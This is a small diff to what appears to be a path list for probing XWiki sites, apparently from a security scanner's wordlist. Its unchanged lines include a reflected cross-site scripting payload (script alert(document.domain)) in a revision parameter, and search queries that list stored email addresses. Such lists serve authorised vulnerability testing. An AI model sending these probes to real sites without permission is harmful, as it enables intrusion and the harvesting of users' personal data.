@@ -257,3 +257,4 @@
 /xwiki/bin/view/Main/?rev=xar%3Aorg.xwiki.platform%3Axwiki-platform-distribution-flavor-common%2F15.5%25%25%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
 /bin/view/Main/Search?sort=score&sortOrder=desc&highlight=true&facet=true&r=1&f_locale=en&f_locale=&text=objcontent%3Aemail*
 /xwiki/bin/view/Main/Search?sort=score&sortOrder=desc&highlight=true&facet=true&r=1&f_locale=en&f_locale=&text=objcontent%3Aemail*
+/
